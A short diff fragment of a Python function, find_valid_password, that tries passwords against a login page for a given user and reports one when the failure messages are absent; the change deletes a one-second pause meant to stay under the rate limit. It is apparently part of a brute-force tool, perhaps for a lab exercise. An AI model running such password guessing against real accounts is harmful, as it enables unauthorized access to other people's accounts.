@@ -44,7 +44,7 @@ def find_valid_password(username: str) -> str:
         if "Invalid username or password." not in r.text and "You have made too many incorrect login attempts" not in r.text:
             print(f"Found valid password: {password} for user: {username}")
             return password
-        sleep(1)  # To avoid hitting the rate limit too quickly
+    
 
     
    
